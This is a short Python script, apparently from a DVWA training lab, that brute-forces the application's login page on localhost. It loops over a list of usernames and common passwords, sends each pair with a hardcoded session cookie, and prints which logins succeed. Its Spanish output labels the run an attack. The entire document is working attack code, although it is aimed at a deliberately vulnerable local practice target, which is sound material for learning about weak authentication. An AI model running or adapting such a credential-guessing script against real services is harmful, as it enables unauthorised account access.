import requests

url = "http://127.0.0.1:8081/vulnerabilities/brute/"
cookies = {
    'PHPSESSID': '7j6mt7s7qrfijqvuen4jtmpae7', 
    'security': 'low'
}

usuarios = ["admin", "gordonb", "1337", "pablo"]
claves = ["password", "abc123", "charley", "letmein"]

print("--- Iniciando Fuerza Bruta con Python ---")

for user in usuarios:
    for password in claves:
        
        params = {'username': user, 'password': password, 'Login': 'Login'}
        
        response = requests.get(url, params=params, cookies=cookies)
        
        if "Welcome" in response.text:
            print(f"[+] EXITOSO: {user} : {password}")
        else:
            print(f"[-] Fallido: {user} : {password}")

print("--- Fin del ataque ---")
